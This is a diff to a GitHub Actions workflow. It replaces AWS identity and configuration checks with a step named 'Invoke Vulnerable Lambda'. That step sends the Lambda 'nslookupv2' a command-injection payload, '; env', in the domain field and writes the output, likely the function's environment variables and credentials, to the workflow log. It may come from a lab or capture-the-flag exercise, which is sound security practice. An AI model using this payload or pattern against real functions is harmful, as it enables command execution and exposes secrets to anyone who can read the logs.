@@ -19,13 +19,15 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Check Lambda Function URL & Configuration
+      - name: Invoke Vulnerable Lambda
         run: |
-          echo "=== 1. Verify Identity ==="
-          aws sts get-caller-identity
+          # 1. Trigger the Lambda with an injected command (e.g. '; env')
+          aws lambda invoke \
+            --function-name nslookupv2 \
+            --cli-binary-format raw-in-base64-out \
+            --payload '{"domain": "; env"}' \
+            response.json
 
-          echo "=== 2. Check for Lambda Function URL ==="
-          aws lambda get-function-url-config --function-name nslookupv2 || echo "No Function URL configured directly"
-
-          echo "=== 3. Get Full Function Details ==="
-          aws lambda get-function --function-name nslookupv2
+          # 2. Print the response directly into the GitHub Actions log
+          echo "=== LAMBDA OUTPUT ==="
+          cat response.json
